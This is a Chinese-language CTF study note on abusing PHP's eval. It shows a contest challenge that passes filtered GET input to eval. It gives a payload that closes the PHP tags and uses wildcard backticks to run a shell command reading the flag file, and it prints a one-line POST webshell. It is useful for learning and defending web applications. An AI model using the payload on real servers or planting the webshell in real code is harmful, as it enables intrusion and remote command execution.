# eval

**参考：**

- https://www.anquanke.com/post/id/173201#h2-1

- https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html

**函数构造：**

```php
eval ( string $code ) : mixed
```

## 利用1-闭合/开启php标签

安恒杯9月月赛web2

```php
<?php 
include 'flag.php';
if(isset($_GET['code']))
{
    $code=$_GET['code'];
    if(strlen($code)>35){
    die("Long.");
    }
    if(preg_match("/[A-Za-z0-9_$]+/",$code))
    {
        die("NO.");
    }
    @eval($code);
}
else
{
    highlight_file(__FILE__);
}
//$hint="php function getFlag() to get flag";
?>
```

eval执行`$code`代码，`$code`需要符合`preg_match`代码的正则匹配。我们可以通过eval函数的来闭合前半部分代码，重启后半部分代码。

**payload**：

```php
code=?><?=`/???/??? ????.???`?>
```

## 利用2-后门

**一句话木马**：

```php
<?php
eval($_POST['2']);
```

因为eval是一个语言构造器而不是一个函数，不能被 [可变函数](http://php.net/manual/zh/functions.variable-functions.php) 调用。

PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。

可变函数不能用于例如 [echo](http://php.net/manual/zh/function.echo.php)，[print](http://php.net/manual/zh/function.print.php)，[unset()](http://php.net/manual/zh/function.unset.php)，[isset()](http://php.net/manual/zh/function.isset.php)，[empty()](http://php.net/manual/zh/function.empty.php)，[include](http://php.net/manual/zh/function.include.php)，[require](http://php.net/manual/zh/function.require.php) 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。

